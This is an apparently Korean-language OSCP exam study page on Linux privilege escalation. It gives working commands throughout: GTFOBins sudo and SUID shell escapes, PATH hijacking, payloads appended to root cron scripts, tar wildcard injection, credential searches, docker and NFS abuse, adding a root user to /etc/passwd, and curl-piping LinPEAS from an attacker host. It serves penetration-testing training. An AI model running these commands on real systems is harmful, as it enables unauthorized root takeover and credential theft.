---
title: Linux 권한 상승
tags:
  - oscp
---

# Linux 권한 상승 { #linux-privilege-escalation }

<div class="dfir-meta" markdown>
**배점:** Linux standalone당 10점 (`proof.txt`) · **최종 수정:** 2026-11-03
</div>

!!! abstract "한 문장 요약"
    낮은 권한 셸에서 root로: 먼저 꼼꼼히 정보 수집하고, 흔한 설정 오류를 순서대로(sudo → SUID / capabilities → cron → 크리덴셜 → 서비스) 확인하고, 커널 익스플로잇은 마지막으로 남겨 둡니다.

!!! tip "실전 실행 참고"
    명령 선택·출력 해석·실패 진단은 [실전 종합 가이드](practical-guide.md#privesc), Windows·AD 프로토콜별 상세 사용법은 [Impacket 집중 가이드](impacket.md)를 참고하세요.

## 1. 개념 { #concept }

리눅스 박스의 root는 몇 군데에서만 나옵니다.

| 출처 | 왜 통하나 |
|---|---|
| **내가 영향을 줄 수 있는 root 실행 대상** | sudo 규칙, SUID 바이너리, capability, root cron, root 서비스, 쓰기 가능한 스크립트 / `PATH` / 라이브러리 |
| **찾을 수 있는 크리덴셜** | 설정 파일, 히스토리, 백업, DB 테이블, SSH 키 — root나 다른 사용자로 재사용 |
| **잘못 설정된 공유나 그룹** | NFS `no_root_squash`, `docker` / `lxd` / `disk` / `adm` 그룹 |
| **취약한 커널이나 SUID 패키지** | PwnKit, DirtyPipe, 오래된 sudo — 최후의 수단 |

두 단계인 경우가 많아요: `www-data` → 실제 사용자(찾은 크리덴셜) → root(sudo 규칙).

## 0. 셸부터 안정화 { #shell-upgrade }

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

자세히 → [셸과 파일 전송 › TTY 업그레이드](shells-file-transfer.md#tty-upgrade).

## 2. 주요 도구 { #tools }

| 도구 | 용도 | 시험 허용 여부 |
|---|---|---|
| **LinPEAS** | 폭넓은 자동 정보 수집, 색으로 강조 | 허용 |
| **pspy** | root 없이 프로세스 관찰(cron, root 스크립트) | 허용 |
| **GTFOBins** | sudo / SUID / capability 바이너리 악용법 | 허용 (참고 사이트) |
| **searchsploit** | 커널 / 패키지 익스플로잇 검색 | 허용 |
| 수동 명령 | `sudo -l`, `find`, `getcap`, `ss`, `ps` | — |

## 3. 시나리오 { #scenarios }

### 3.1 첫 5분 — 수동 확인 { #enumeration }

```bash
id; hostname; ip a
sudo -l                                   # 비밀번호를 묻나? 찾은 건 다 넣어 보기
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null
ss -tulpn                                  # 로컬 전용 서비스 (127.0.0.1)
ps aux --forest | grep -v '\]$'           # root로 뭐가 도나?
ls -la /home/* /opt /var/backups /var/www 2>/dev/null
uname -a; cat /etc/os-release
```

**볼 것:** `sudo -l` 의 `(root) NOPASSWD:`; 표준 목록에 없는 SUID 바이너리(`/usr/bin/passwd`, `mount`, `su`, `sudo` 등은 정상 — `/usr/bin/find`, `/opt/backup`, `python3` 는 비정상); `cap_setuid+ep` 같은 capability; `docker`, `lxd`, `disk` 같은 그룹.

### 3.2 LinPEAS — 넓게 훑기 { #linpeas }

**상황:** 수동 확인으로 뻔한 경로가 안 보임.

```bash
# Kali: python3 -m http.server 80
curl http://<KALI>/linpeas.sh | sh | tee /tmp/lp.txt
# 또는 내려받아 chmod +x 후 실행
```

**볼 것:** **빨강 바탕에 노랑** = "95% 권한 상승 경로"; 빨강 = 확인할 가치 있음. 집중할 곳: *Sudo version*, *SUID*, *Capabilities*, *Cron jobs*, *Writable files owned by root*, *Interesting files*(설정 속 비밀번호), *Active ports*, *Users with console*.

**다음:** 강조된 항목마다 → GTFOBins나 아래 시나리오. CVE 제안은 버전 번호 기반 추측이니 맹신하지 마세요.

### 3.3 sudo 규칙 → GTFOBins { #sudo }

**상황:** `sudo -l` 에 예를 들어 `(root) NOPASSWD: /usr/bin/find`.

[GTFOBins](https://gtfobins.github.io/)에서 바이너리를 찾아 **Sudo** 섹션:

```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**확인할 변형:**

- root로 실행할 수 있는 **스크립트**(`sudo /opt/backup.sh`) → 스크립트를 쓸 수 있나, 또는 전체 경로 없이 부르는 파일 / 명령이 있나?
- `sudo -l` 에 `env_keep+=LD_PRELOAD` → 셸을 띄우는 작은 공유 라이브러리를 만들어 preload.
- 허용된 명령의 와일드카드(`/usr/bin/cat /var/log/*`) → 경로 탐색(`/var/log/../../etc/shadow`).
- 오래된 sudo 버전(`sudo -V`) → 알려진 CVE(예: Baron Samedit, CVE-2021-3156)는 나중 옵션.

### 3.4 SUID / capabilities → GTFOBins { #suid-capabilities }

**상황:** `find / -perm -4000` 에 `/usr/bin/python3.8`, 또는 `getcap` 에 `cap_setuid+ep`.

```bash
# SUID 바이너리 (GTFOBins → "SUID" 섹션 — 권한 유지를 위한 -p 주의)
/usr/bin/find . -exec /bin/sh -p \; -quit
# python에 cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**자작 SUID 바이너리**(`/usr/local/bin/backup`): `strings` 로 보세요 — `tar`, `cp`, `service` 를 **전체 경로 없이** 부르나? 그럼 `PATH` 하이재킹:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar; chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
```

### 3.5 cron과 숨은 root 프로세스 — pspy { #cron-pspy }

**상황:** `/etc/crontab` 엔 없는데 뭔가 예약돼 도는 느낌(계속 갱신되는 로그 파일, `/opt/scripts` 폴더).

```bash
# pspy64 업로드 후
chmod +x /tmp/pspy64; /tmp/pspy64 -pf -i 1000
```

**볼 것:** 1분마다 반복되는 `UID=0` 줄 — 예: `UID=0 PID=2345 | /bin/sh -c /opt/scripts/cleanup.sh`, `tar czf /backups/web.tgz *`.

**다음:**

- **쓰기 가능한 스크립트** → 페이로드 덧붙이기:
    ```bash
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
    # 한 주기 기다린 뒤
    /tmp/rootbash -p
    ```
- 쓸 수 있는 디렉터리에서 **`tar` 와일드카드**:
    ```bash
    cd /var/www/html
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
    touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
    ```
- 스크립트가 바이너리를 **이름으로** 부르고 cron `PATH` 에 쓰기 가능한 디렉터리가 있으면 → 같은 이름의 바이너리 심기.

### 3.6 박스 안의 크리덴셜 { #credentials }

권한 상승은 그냥 **크리덴셜 재사용** 인 경우가 많아요.

```bash
cat ~/.bash_history ~/.*_history 2>/dev/null
grep -rniE 'pass(word)?\s*[=:]|DB_PASS|secret' /var/www /opt /etc /home 2>/dev/null | grep -v '^Binary'
find / -name '*.bak' -o -name '*.old' -o -name '*.kdbx' -o -name 'id_rsa*' 2>/dev/null
cat /var/www/*/wp-config.php /var/www/*/config*.php 2>/dev/null
```

**볼 것:** DB 비밀번호(`su root`, `su <user>`, SSH에 시도), 개인 키, `.git` 디렉터리(히스토리), `/var/mail` 의 메일.

**다음:** 비밀번호마다 `su -`; DB에 로그인해 사용자 테이블 읽기 → [패스워드 공격](password-attacks.md).

### 3.7 내부 서비스 { #internal-services }

**상황:** `ss -tulpn` 에 nmap이 못 본 `127.0.0.1:8080` 이나 `127.0.0.1:3306`.

Kali로 포워딩해서 새 대상처럼 공격합니다.

```bash
# 사용자로 SSH가 될 때
ssh -L 8080:127.0.0.1:8080 user@$IP
# SSH가 없으면: chisel 리버스 포트 포워드
./chisel client <KALI>:8000 R:8080:127.0.0.1:8080     # Kali: ./chisel server -p 8000 --reverse
```

그다음 Kali에서 `http://127.0.0.1:8080` 접속. root로 도는 내부 웹 앱(관리 패널, Jenkins, 개발 API)은 자주 나오는 의도된 경로입니다. 더 보기 → [피벗팅](pivoting.md).

### 3.8 그룹: docker / lxd / disk / adm { #groups }

| 그룹 (`id` 결과) | root까지의 경로 |
|---|---|
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | 작은 이미지를 import하고 `/` 를 마운트한 privileged 컨테이너 생성 |
| `disk` | `debugfs /dev/sda1` → `/root/.ssh/id_rsa` 나 `/etc/shadow` 읽기 |
| `adm` | `/var/log` 로그 읽기 — auth / 앱 로그 속 크리덴셜 |

### 3.9 NFS no_root_squash { #nfs }

**상황:** `cat /etc/exports`(또는 Kali에서 `showmount -e`)에 `/srv/share *(rw,no_root_squash)`.

```bash
# Kali, root로
sudo mount -t nfs -o vers=3 $IP:/srv/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod +s /mnt/nfs/rootbash
# 대상
/srv/share/rootbash -p
```

(Kali의 bash가 대상 libc보다 새로우면 대상과 호환되는 bash 바이너리를 복사하세요.)

### 3.10 쓰기 가능한 /etc/passwd 나 /etc/shadow { #writable-passwd }

```bash
ls -l /etc/passwd /etc/shadow
openssl passwd -1 'Pwned123'                     # → $1$...
echo 'r00t:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t
```

### 3.11 커널 익스플로잇 — 최후의 수단 { #kernel }

```bash
uname -r; cat /etc/os-release; dpkg -l | grep -i polkit   # PwnKit 확인
searchsploit linux kernel 4.4 privilege escalation
```

흔한 후보: **PwnKit**(CVE-2021-4034, polkit `pkexec`), **DirtyPipe**(CVE-2022-0847, 커널 5.8–5.16.x), **DirtyCow**(오래된 커널). 맞는 시스템에서 컴파일하거나 정적 빌드를 쓰고, 먼저 익스플로잇을 읽으세요 — 커널 패닉은 revert 한 번을 날립니다.

## 4. 자주 하는 실수 { #mistakes }

- **LinPEAS를 돌리고 CVE 목록만 보기.** 의도된 경로는 보통 같은 출력 안의 sudo 규칙, cron, 크리덴셜이에요.
- **비밀번호를 묻는다고 `sudo -l` 건너뛰기** — 찾은 비밀번호를 전부 넣어 보세요.
- **pspy 안 쓰기.** 사용자 crontab의 root 작업은 `/etc/crontab` 에 안 보입니다.
- **SUID bash / sh에 `-p` 빠뜨리기** — 없으면 셸이 권한을 버립니다.
- **커널 익스플로잇부터** 해서 박스를 죽이기.
- **두 번째 사용자 놓치기.** `www-data` → `user`(설정 속 비밀번호) → root가 아주 흔해요.

## 5. 시험 팁 { #exam-tips }

- proof 스크린샷: 대화형 셸에서 `cat /root/proof.txt`, `whoami`, `ip a` 를 **한** 화면에([플래그 규칙](exam-format.md#flag-rules)).
- 시간 제한: 수동 확인 + LinPEAS + pspy에 30분. 그래도 없으면 출력을 처음부터 다시 읽고 — 내부 서비스를 찾으세요.
- 써 본 GTFOBins 항목은 개인 목록으로 남겨 두세요. 많이 재사용됩니다.

## 체크리스트 { #checklist }

- [ ] 셸을 제대로 된 TTY로 업그레이드
- [ ] `sudo -l` 확인(알고 있는 모든 비밀번호로) → GTFOBins
- [ ] SUID + capabilities 확인 → GTFOBins
- [ ] cron 읽고 `pspy` 실행(쓰기 가능한 스크립트? 와일드카드?)
- [ ] 설정 파일 / 히스토리 / 백업 / SSH 키에서 크리덴셜 검색
- [ ] 로컬 전용 서비스 찾아 포워딩
- [ ] 그룹(`docker`, `lxd`, `disk`)과 NFS export 확인
- [ ] 커널 / 배포판 버전 기록(마지막 옵션으로)

## 관련 페이지 { #related-pages }

- [시험 흐름](exam-workflow.md) · [셸과 파일 전송](shells-file-transfer.md) · [피벗팅](pivoting.md) · [패스워드 공격](password-attacks.md)
- 방어자 관점: [Linux 인증과 히스토리](../../linux/auth-and-history.md) · [Linux 지속성](../../linux/persistence.md) · [Linux 로그와 트리아지](../../linux/logs-and-triage.md)
- [Linux 명령어](../../basics/linux-commands.md) · [방법론과 습관](methodology.md)

## 참고 자료 { #references }

- [GTFOBins](https://gtfobins.github.io/)
- [PEASS-ng (LinPEAS)](https://github.com/peass-ng/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
